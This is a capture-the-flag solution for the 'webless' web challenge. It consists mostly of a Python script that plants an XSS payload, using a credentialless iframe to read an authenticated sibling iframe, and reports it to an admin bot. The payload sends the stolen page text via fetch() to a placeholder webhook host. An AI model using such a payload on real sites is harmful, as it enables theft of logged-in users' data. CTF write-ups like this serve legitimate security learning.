# Solution

Use credentialless iframe to get XSS and a normal (authenticated) iframe to read the flag.

```python
import requests

s = requests.Session()
URL = "https://webless-a0760039971fe89e.challs.tfcctf.com"

solution = """
<iframe src="/post/0"></iframe>
<iframe credentialless src="/login?username=<script>fetch(`https://WEBHOOOK/${btoa(top.window.frames[0].document.body.innerText.substr(20))}`)</script>&password=a"></iframe>
"""

s.post(URL+"/register", data={"username": "test", "password": "test"})
s.post(URL+"/create_post", data={"title": "LEAK", "description": solution, "hidden": "off"})
s.post(URL+"/report", data={"url": "http://127.0.0.1:5000/post/1"})

print("Check the webhook")
```